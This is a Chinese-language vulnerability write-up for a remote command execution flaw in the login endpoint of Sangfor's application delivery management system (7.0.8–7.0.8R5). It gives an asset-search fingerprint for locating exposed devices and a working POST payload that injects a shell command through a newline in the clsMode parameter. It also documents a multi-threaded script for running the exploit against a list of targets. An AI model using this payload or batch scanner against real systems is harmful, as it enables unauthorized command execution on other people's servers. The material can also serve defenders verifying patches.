# 深信服 应用交付管理系统 login 远程命令执行漏洞

## 漏洞描述

深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令

## 漏洞影响

深信服 应用交付管理系统 7.0.8-7.0.8R5

## 网络测绘

fid="iaytNA57019/kADk8Nev7g=="

## 漏洞复现

登陆页面

![img](https://peiqi.wgpsec.org/assets/img/1675307887742-7f1d91ab-0fc3-4b09-b434-70466ec13871.d5bf6012.png)

验证POC

```plain
POST /rep/login 

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```



![img](https://peiqi.wgpsec.org/assets/img/1675307928621-8722e4f7-ddd8-44ee-9010-4f9189a12081.ae1c4259.png)

## 脚本使用

```
python poc.py -f 1.txt -t 50
```

```
  -f FILEPATH, --filepath FILEPATH
                        包含目标列表的txt文件路径
  -t THREADS, --threads THREADS
                        线程数，默认为10
```

txt格式如下：

![image-20230813111759108](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230813111840487-1133188023.png)